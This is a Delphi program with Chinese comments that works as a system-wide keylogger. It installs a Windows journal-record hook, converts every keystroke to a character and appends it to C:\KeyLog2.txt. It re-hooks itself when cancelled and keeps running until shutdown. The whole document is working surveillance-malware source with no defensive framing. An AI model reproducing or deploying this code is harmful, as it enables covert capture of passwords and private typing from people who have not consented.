program KeyLog2;

uses Windows, Messages;

var JournalRecordHook: HHOOK;

 // 记录钩子回调函数
function JournalRecordProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Kbs: TKeyboardState;
  HFile: THandle;
  WChar: array[0..1] of Char;
  WSize: DWORD;
begin
 // lParam指向消息结构, 并且, 是键盘按下消息
  if (nCode = HC_ACTION) and (PEventMsg(lParam).message = WM_KEYDOWN) then
  begin
   // 取键盘状态
    GetKeyboardState(Kbs);

   // 转换成字符
    if ToAscii(PEventMsg(lParam).paramL, PEventMsg(lparam).paramH, Kbs, WChar, 0) = 1 then
    begin
     // 打开文件
      HFile := CreateFile('C:\KeyLog2.txt', GENERIC_WRITE,
        FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

     // 添加字符
      SetFilePointer(HFile, 0, nil, FILE_END);
      WriteFile(HFile, WChar[0] , 1, WSize, nil);

     // 回车补#10
      if (WChar[0] = #13) then
      begin
        WChar[0] := #10;
        WriteFile(HFile, WChar[0] , 1, WSize, nil);
      end;

     // 关闭保存
      CloseHandle(HFile);
    end;
  end;

 // 传给下一个钩子处理, 并且返回它的返回值
  Result := CallNextHookEx(JournalRecordHook, nCode, wParam, lParam);
end;

 // ~~~~~ 程序入口 ~~~~~
var
  Msg: TMsg;
begin
 // 安装钩子
  JournalRecordHook := SetWindowsHookEx(WH_JOURNALRECORD, @JournalRecordProc, HInstance, 0);

 // 消息循环
  while GetMessage(Msg, 0, 0, 0) do
    if (Msg.message = WM_CANCELJOURNAL) then // 此时需要重新挂钩
    begin
      JournalRecordHook :=
        SetWindowsHookEx(WH_JOURNALRECORD, @JournalRecordProc, HInstance, 0);
    end;

 // 卸载钩子
  UnHookWindowsHookEx(JournalRecordHook);

 (* 注: 由于这个程序并不像其他普通的Windows程序那样, 建立窗口并且在窗口关闭时调用PostQuitMessage(),
    使得GetMessage()随后取到WM_QUIT返回FALSE, 而跳出消息循环, 所以这个程序会一直运行下去直到关机 *)
end.